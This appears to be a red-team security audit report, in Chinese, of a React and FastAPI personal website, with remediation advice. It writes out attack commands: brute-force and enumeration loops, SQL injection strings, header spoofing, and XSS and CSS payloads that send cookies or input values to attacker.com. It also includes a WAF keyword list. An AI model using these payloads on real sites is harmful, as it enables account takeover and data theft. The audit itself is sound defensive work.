# Security Audit Report — Personal Website
**審計日期：** 2026-04-17  
**審計員：** Claude (模擬攻擊手 Red Team)  
**目標系統：** React + FastAPI + SQLite 個人網站（含留言板功能）  
**技術棧：** React 18, FastAPI 0.115, SQLAlchemy 2.0, SQLite, slowapi, bleach, Pillow 10.4, python-jose (JWT)

---

## 摘要評分

| 類別 | 狀態 |
|------|------|
| SQL Injection | ✅ 安全 |
| XSS | ✅ 安全 |
| File Upload | ✅ 安全 |
| Path Traversal | ✅ 安全 |
| IDOR | ✅ 安全 |
| Authentication | ⚠️ 部分問題 |
| Session/Cookie | 🔴 高風險漏洞 |
| Rate Limiting | ⚠️ 部分問題 |
| CSP Headers | ⚠️ 部分問題 |
| WAF (Pattern Detection) | ⚠️ 設計誤區 |

---

## Attack 1 — Reconnaissance（偵察）

### 手法
在不登入的情況下，透過靜態程式碼與 HTTP 探測，繪製系統攻擊面。

### 過程
1. 發現技術棧：React 前端、FastAPI 後端、SQLite 資料庫
2. FastAPI Swagger UI 已關閉（`docs_url=None, redoc_url=None, openapi_url=None`）
3. 伺服器回應移除 `Server` 標頭，無法直接判斷版本
4. 但仍可枚舉出所有 API 端點：

```
GET  /uploads/{filename}      # 頭貼存取（無需認證）
POST /api/register             # 帳號註冊
POST /api/login                # 登入
POST /api/logout               # 登出
GET  /api/me                   # 取得自身資料
POST /api/avatar               # 更新頭貼
GET  /api/messages             # 讀取留言（無需認證）
POST /api/messages             # 發留言
DELETE /api/messages/{id}      # 刪除留言
```

### 結果
- **Swagger/OpenAPI 已關閉**：降低了自動化掃描的難度，但端點仍可透過前端 JS 原始碼找到
- **API 端點完全暴露**：前端 `App.jsx` 直接可見所有 API 路徑
- **技術棧版本可推測**：透過 `requirements.txt` 或錯誤訊息格式推測後端框架

### 風險等級：INFO

---

## Attack 2 — Username Enumeration（帳號枚舉）

### 手法
利用 `/api/register` 端點的不同錯誤訊息，探測系統中已存在的帳號。

### 過程
```bash
# 攻擊指令（模擬）
curl -X POST http://target/api/register \
  -F "username=thomas" \
  -F "password=anypassword"
```

**回應差異：**
- 帳號不存在：`201 Created` → 成功建立
- 帳號已存在：`400 Bad Request` → `{"detail": "此帳號已存在"}`

```python
# 攻擊腳本概念
usernames = ["thomas", "admin", "root", "thomas_chang", ...]
for username in usernames:
    r = requests.post("/api/register", data={"username": username, "password": "x"*6})
    if r.status_code == 400 and "已存在" in r.text:
        print(f"[FOUND] {username} exists in database")
    elif r.status_code == 201:
        # 已建立帳號，但知道原帳號不存在
        requests.post("/api/delete_just_registered_account")  # 清理
```

### 結果
- **攻擊成功：** 可確認特定用戶名是否存在
- **影響：** 可用於後續暴力破解攻擊，縮小目標範圍
- **防護現況：** 登入端點 `/api/login` 使用統一錯誤訊息「帳號或密碼錯誤」（✅ 正確），但註冊端點洩漏了帳號存在性

### 風險等級：LOW（因帳號本身為公開的 username，且留言板已顯示 username）

### 修復建議
```python
# 方案1: 統一回應，不洩漏原因
raise HTTPException(400, "無法完成註冊，請檢查輸入")

# 方案2: 接受「帳號枚舉」但用 rate limiting 保護（已有 5/minute，足夠）
# 目前 5/minute 已可防止大規模枚舉，此問題低優先
```

---

## Attack 3 — Brute Force Login（暴力破解登入）

### 手法
對 `/api/login` 進行密碼暴力破解。

### 過程
```bash
# 針對已知帳號 "thomas" 嘗試常見密碼
for password in $(cat rockyou.txt | head -1000); do
  curl -s -X POST http://target/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"thomas\",\"password\":\"$password\"}"
done
```

**Rate Limit 測試：**
- 限制：`10/minute` per IP
- 每分鐘最多 10 次嘗試
- 每天 = 14,400 次嘗試（如果 IP 不輪換）
- 搭配 VPN/Tor 輪換 IP → 理論上無限嘗試

**Timing Attack 測試：**
- 程式碼：`if not user or not verify_password(...)` — 短路邏輯
- 若帳號不存在：`not user` 為 True，立即返回，不執行 `verify_password`
- 若帳號存在：需執行 bcrypt 比對（慢 ~100ms）
- **輕微 Timing Leak：** 帳號不存在比帳號存在但密碼錯誤快約 100ms
- 但 bcrypt 本身很慢，實際可利用性低

### 結果
- Rate limiting 提供基本防護（10/minute）
- **無帳號鎖定機制：** 1 分鐘後自動重置，可無限嘗試
- 輕微 timing leak 可加劇帳號枚舉

### 風險等級：MEDIUM

### 修復建議
```python
# 加入帳號鎖定（連續失敗後封鎖）
# 或：constant-time 確保帳號存在與否回應時間相同
import time
user = db.query(User).filter(User.username == body.username).first()
dummy_hash = "$2b$12$invalidhashinvalidhashinvalidhashXXXXXXXXXXXXXXXXXXXXXX"
verify_password(body.password, user.hashed_password if user else dummy_hash)
if not user or not result:
    raise HTTPException(401, "帳號或密碼錯誤")
```

---

## Attack 4 — Session Cookie Theft（Session 劫持）

### 手法
在 HTTP 環境下，透過 MITM（中間人攻擊）竊取 session cookie。

### 過程
**關鍵漏洞（backend/main.py 第 306 行）：**
```python
response.set_cookie(
    key="session",
    value=token,
    httponly=True,
    samesite="strict",
    max_age=TOKEN_EXPIRE_HOURS * 3600,
    # secure=True,  # 啟用 HTTPS 後請取消註解  ← ⚠️ 已被註解掉！
)
```

**攻擊場景：**
```
1. 受害者在公共 WiFi（咖啡廳）登入網站（HTTP）
2. 攻擊者在同網路執行 ARP Spoofing
3. 攻擊者 tcpdump 攔截 HTTP 流量
4. 明文看到: Cookie: session=eyJhbGciOiJIUzI1NiJ9.xxxxx
5. 攻擊者使用此 Cookie 冒充受害者
```

```bash
# 攔截範例（Wireshark filter）
http.cookie contains "session"

# 使用竊取的 cookie
curl http://target/api/me \
  -H "Cookie: session=STOLEN_TOKEN_HERE"
```

**JWT 解碼（無需金鑰，base64 decode）：**
```bash
echo "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIiwiZXhwIjoxNjAwMDAwMDAwfQ" | \
  python3 -c "import sys,base64,json; parts=sys.stdin.read().strip().split('.'); print(json.dumps(json.loads(base64.b64decode(parts[1]+'==').decode()), indent=2))"
# Output: {"sub": "1", "exp": 1600000000}
# 攻擊者知道 user_id=1，token 到期時間
```

### 結果
- **🔴 高風險：** `secure=True` 被註解掉，cookie 在 HTTP 下以明文傳輸
- 若部署在公開伺服器且未強制 HTTPS，任何網路監聽者皆可竊取 session
- JWT 使用 HS256，payload 可解碼（非加密，只是簽名）

### 風險等級：**HIGH**（若未部署 HTTPS）

### 修復建議
```python
# 步驟 1：取消註解 secure=True
response.set_cookie(
    key="session",
    value=token,
    httponly=True,
    samesite="strict",
    secure=True,   # ← 取消此行的註解！
    max_age=TOKEN_EXPIRE_HOURS * 3600,
)

# 步驟 2：在 nginx/caddy 設定 HTTPS redirect
# 步驟 3：加入 HSTS header（見 Header 部分）
```

---

## Attack 5 — Rate Limit Bypass（速率限制繞過）

### 手法
分析 rate limiter 的 key 函數，尋找繞過方式。

### 過程
```python
# slowapi 的 get_remote_address 實作
def get_remote_address(request: Request) -> str:
    if not request.client or not request.client.host:
        return "127.0.0.1"
    return request.client.host  # 使用 TCP 連線的實際 IP
```

**場景一：直連伺服器（無 proxy）**
- 使用 `request.client.host`（TCP 層 IP），不信任 `X-Forwarded-For`
- `X-Forwarded-For: 1.2.3.4` 無法繞過 → **攻擊失敗**

**場景二：透過 nginx reverse proxy 部署，且 uvicorn 啟用 `--proxy-headers`**
```bash
# 若 uvicorn 以此方式啟動：
uvicorn backend.main:app --proxy-headers

# 則 X-Forwarded-For 被信任，rate limit key = X-Forwarded-For 值
curl -X POST http://target/api/login \
  -H "X-Forwarded-For: 1.2.3.4" \   # 偽造 IP
  -H "Content-Type: application/json" \
  -d '{"username":"thomas","password":"wrong"}'
# 每次請求換不同 IP 值 → 無限嘗試！
```

**未受 Rate Limit 保護的端點：**
- `GET /uploads/{filename}` — 無限制（可用於目錄掃描）
- `GET /api/me` — 無限制（可用於 token 驗證）
- `GET /api/messages` — 無限制（可用於輪詢/scraping）
- `POST /api/logout` — 無限制

### 結果
- 直連情況下 rate limit 有效
- **⚠️ 若使用 `--proxy-headers` 且客戶端可控制 X-Forwarded-For，rate limit 可繞過**
- 部分端點完全缺少 rate limiting

### 風險等級：MEDIUM（依部署配置而定）

### 修復建議
```python
# 若使用 reverse proxy，指定信任的 proxy IP
from slowapi.util import get_remote_address
from starlette.requests import Request

def get_real_ip(request: Request) -> str:
    # 只信任來自 localhost (nginx) 的 X-Real-IP
    if request.client and request.client.host in ("127.0.0.1", "::1"):
        return request.headers.get("X-Real-IP", request.client.host)
    return request.client.host or "127.0.0.1"

limiter = Limiter(key_func=get_real_ip)

# 同時為缺少保護的端點加上限制
@app.get("/api/messages")
@limiter.limit("60/minute")
async def get_messages(...):
    ...
```

---

## Attack 6 — File Upload Attack（惡意檔案上傳）

### 手法
嘗試上傳惡意檔案繞過頭貼驗證，達到 RCE 或 XSS。

### 過程與結果

| 攻擊手法 | Payload | 結果 |
|----------|---------|------|
| PHP WebShell | `evil.php` rename to `evil.jpg` | ✅ 被 Pillow 驗證攔截 |
| SVG XSS | `<svg onload=alert(1)>` | ✅ 副檔名不在白名單 |
| 雙重副檔名 | `evil.php .jpg` | ✅ `Path().name` 只取檔名部分 |
| Path Traversal | `../../../etc/passwd` | ✅ `Path().name` 只取 `passwd`，且存於 uploads 目錄 |
| 解壓縮炸彈 | 14700x14700 JPEG | ✅ `thumbnail(400,400)` 限制尺寸 |
| GIF Polyglot | 偽造 JPEG header 的 GIF | ✅ Pillow `img.format` 驗證攔截 |
| Null Byte | `evil.php\x00.jpg` | ✅ Python 3 字串處理安全 |
| EXIF 惡意資料 | 含 JS payload 的 EXIF | ✅ `convert("RGB")` 剝除所有 metadata |

**Pillow 版本漏洞：**
- 安裝版本：`Pillow 10.4.0`
- CVE-2024-28219（heap overflow，影響 < 10.3.0）→ **已修補**
- CVE-2023-50447（RCE via crafted image，影響 < 10.2.0）→ **已修補**

### 結果
- **攻擊失敗：** 圖片處理鏈安全，所有已知向量均被攔截
- UUID 重命名防止檔名猜測攻擊
- EXIF metadata 剝除防止隱藏 payload

### 風險等級：✅ 安全

---

## Attack 7 — SQL Injection（SQL 注入）

### 手法
透過各輸入點嘗試 SQL 注入。

### 過程
```bash
# 登入端點注入
curl -X POST http://target/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'"'"' OR 1=1--","password":"x"}'

# 留言注入
curl -X POST http://target/api/messages \
  -d '{"content":"'"'"'; DROP TABLE messages;--"}'
```

**SQLAlchemy ORM 參數化查詢：**
```python
# 實際執行的 SQL（parameterized）
db.query(User).filter(User.username == body.username)
# → SELECT users.id FROM users WHERE users.username = ?  ['admin\' OR 1=1--']
# 值作為參數傳遞，不拼接進 SQL 字串
```

### 結果
- **攻擊失敗：** 全程使用 ORM，無原始 SQL 字串拼接
- SQLAlchemy 自動參數化所有查詢

### 風險等級：✅ 安全

---

## Attack 8 — XSS（跨站腳本攻擊）

### 手法
在留言板嘗試注入惡意腳本，讓其他用戶的瀏覽器執行。

### 過程
```bash
# 嘗試各種 XSS Payload
curl -X POST http://target/api/messages \
  -H "Cookie: session=VALID_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"content":"<script>document.location='"'"'http://attacker.com/?c='"'"'+document.cookie</script>"}'
```

**bleach.clean 測試結果（tags=[], strip=True）：**
```
"<script>alert(1)</script>"     → "alert(1)"      # 標籤被剝除
"<img src=x onerror=alert(1)>" → ""               # 整個標籤移除
"<svg onload=alert(1)>"        → ""               # 整個標籤移除
"<scr\tipt>"                   → ""               # Tab 注入也被剝除
```

**前端渲染：**
```jsx
// App.jsx:621 — React 使用 text node，自動 HTML escape
<p>{msg.content}</p>
// 即使 bleach 失效，React 也不會執行 <script> 標籤
```

**用戶名 XSS：**
- 用戶名只允許 `[a-zA-Z0-9_]`，無法注入 HTML

### 結果
- **攻擊失敗：** 雙重防護（bleach 後端 + React 前端自動 escape）
- 防護深度良好（Defense in Depth）

### 風險等級：✅ 安全

---

## Attack 9 — IDOR（不安全直接物件參照）

### 手法
嘗試存取或操作其他用戶的資源。

### 過程
```bash
# 嘗試刪除別人的留言（已知 message_id 為整數序列）
curl -X DELETE http://target/api/messages/1 \
  -H "Cookie: session=ATTACKER_TOKEN"
# → 403 Forbidden: {"detail": "無權限刪除此留言"}

# 嘗試枚舉所有留言內容
curl http://target/api/messages
# → 成功（無需認證），返回所有 100 筆留言
# 但這是公開留言板，屬於設計行為
```

**用戶 ID 暴露：**
```json
{
  "id": 5,
  "content": "Hello",
  "user_id": 3,          // ← 暴露整數 user_id
  "author": {
    "id": 3,
    "username": "alice",
    "avatar_filename": "uuid-xxx.jpg"  // ← 可存取頭貼
  }
}
```

### 結果
- **刪除他人留言：** ✅ 攔截（403）
- **user_id 暴露：** ⚠️ 低風險（無實際攻擊面）
- **缺少管理員功能：** 網站擁有者（Thomas）無法刪除不當留言

### 風險等級：LOW

### 修復建議
```python
# 可從 API 回應移除 user_id（前端不需要）
def _message_dict(m, current_user_id=None):
    return {
        "id": m.id,
        "content": m.content,
        "created_at": m.created_at.isoformat(),
        "is_own": m.user_id == current_user_id,  # 改為 boolean
        "author": _user_dict(m.author),
    }
```

---

## Attack 10 — WAF Bypass（規則繞過）

### 手法
分析並繞過 `SecurityMiddleware` 的可疑請求偵測邏輯。

### 過程
```python
# 偵測清單（含空格的關鍵字）
SUSPICIOUS_PATTERNS = [
    "../", "..\\", "<script", "select ", "union ", ...
]
```

**Bypass 測試：**
```
"SELECT*FROM users"     → 無空格，不匹配 "select " → BYPASS（但 SQLAlchemy 保護）
"select/**/password"    → 無空格 → BYPASS
"<scr\tipt>"            → tab 字元中斷 → BYPASS
```

**最關鍵問題：WAF 只記錄，不阻擋**
```python
async def dispatch(self, request: Request, call_next):
    # ...偵測可疑內容...
    logger.warning(f"[SUSPICIOUS] ...")   # 只記錄
    response = await call_next(request)   # 繼續執行！不阻擋！
    return response
```

### 結果
- **WAF 存在設計誤區：** 開發者可能以為 WAF 有阻擋效果，實際上只有日誌
- Bypass 技術多種，但因有 SQLAlchemy ORM 和 bleach，底層已安全
- **真正的問題：** 給開發者錯誤的安全感

### 風險等級：MEDIUM（設計誤解風險，非直接攻擊面）

---

## Attack 11 — CSP / Security Headers（標頭分析）

### 手法
檢查所有 HTTP 安全標頭的設定，尋找弱點。

### 分析結果

**✅ 已設定（有效）：**
| Header | 值 | 效果 |
|--------|---|------|
| `X-Frame-Options` | `DENY` | 防止 Clickjacking |
| `X-Content-Type-Options` | `nosniff` | 防止 MIME 嗅探 |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | 限制 Referer 洩漏 |
| `frame-ancestors` | `'none'` | CSP 層面防 Clickjacking（重複但兼容舊瀏覽器）|

**⚠️ 問題設定：**
```
Content-Security-Policy:
  script-src 'self' 'unsafe-inline'   ← 允許所有 inline script，XSS 防護形同虛設
  style-src  'self' 'unsafe-inline'   ← 允許 CSS injection（資料外洩攻擊）
```

**CSS Injection 攻擊範例（若有 XSS 插入點）：**
```css
/* 攻擊者注入的 CSS */
input[name="password"][value^="a"] { background: url(http://attacker.com/log?c=a) }
input[name="password"][value^="b"] { background: url(http://attacker.com/log?c=b) }
/* 逐字元猜測 input 的值 */
```

**🔴 缺少重要 Header：**
```
Strict-Transport-Security (HSTS)  — 未設定，瀏覽器不強制 HTTPS
Permissions-Policy                — 未設定，未限制 camera/mic/geolocation
```

### 修復建議
```python
# 使用 nonce 取代 unsafe-inline（需要 React 端配合 Vite 設定）
import secrets as _secrets
nonce = _secrets.token_hex(16)
response.headers["Content-Security-Policy"] = (
    f"default-src 'self'; "
    f"script-src 'self' 'nonce-{nonce}'; "   # 每次請求新 nonce
    f"style-src 'self' 'nonce-{nonce}' https://fonts.googleapis.com; "
    f"font-src https://fonts.gstatic.com; "
    f"img-src 'self' data: blob:; "
    f"frame-ancestors 'none'"
)
# 加入 HSTS（啟用 HTTPS 後）
response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
# 加入 Permissions-Policy
response.headers["Permissions-Policy"] = "camera=(), microphone=(), geolocation=()"
```

### 風險等級：MEDIUM

---

## 綜合漏洞總表

| # | 漏洞 | 嚴重性 | 可利用性 | 修復難度 |
|---|------|--------|---------|---------|
| 1 | Cookie 缺少 `secure` flag | 🔴 HIGH | 需要同網路 MITM | 極低（取消一行註解）|
| 2 | CSP `unsafe-inline` | 🟡 MEDIUM | 需先有其他漏洞 | 中（需 nonce 機制）|
| 3 | 無帳號鎖定機制 | 🟡 MEDIUM | 需 IP 輪換 | 中（加 Redis 記錄）|
| 4 | WAF 只記錄不阻擋（誤導） | 🟡 MEDIUM | 設計問題 | 低（文件說明）|
| 5 | Rate limit 在 proxy 模式可能繞過 | 🟡 MEDIUM | 需特定部署配置 | 中 |
| 6 | 用戶名枚舉（register 端點）| 🟢 LOW | 簡單自動化 | 低 |
| 7 | 缺少 HSTS header | 🟢 LOW | 需 HTTPS 環境 | 極低 |
| 8 | 部分端點缺 rate limiting | 🟢 LOW | 需大量請求 | 低 |
| 9 | 無管理員刪留言功能 | 🟢 LOW | 無害但功能缺失 | 低 |
| 10 | 輕微 timing leak（登入）| 🔵 INFO | 極難實際利用 | 中 |

---

## 優先修復清單

### 立即修復（今天）
1. **取消 `secure=True` 的註解**（[backend/main.py:306](backend/main.py#L306)）— 一行程式碼，高影響

### 短期修復（本週）
2. 加入 `Strict-Transport-Security` header
3. 加入 `Permissions-Policy` header
4. 修正 rate limiting 端點（補上 `/api/messages` GET, `/api/me`）
5. 明確在 README 標記「WAF 只有日誌功能，非阻擋型」避免誤解

### 中期改善
6. 實作帳號連續失敗鎖定（需 Redis 或 DB 記錄失敗次數）
7. 替換 CSP `unsafe-inline` 為 nonce 機制（需 Vite 端配合）
8. 加入 admin 刪除留言功能

---

## 整體評估

**這個網站的安全性基礎不錯。** SQLi、XSS、檔案上傳、路徑穿越等常見 OWASP Top 10 漏洞均已防護，使用了正確的工具（ORM、bleach、Pillow 驗證鏈、UUID 重命名）。

**最緊迫的問題只有一個：** Cookie 的 `secure` flag 被錯誤地註解掉了。一旦部署到公開 HTTP 環境，session 將在明文傳輸中暴露。這個修復只需一秒鐘。

其餘問題屬於防禦深度強化，不是緊急安全漏洞。
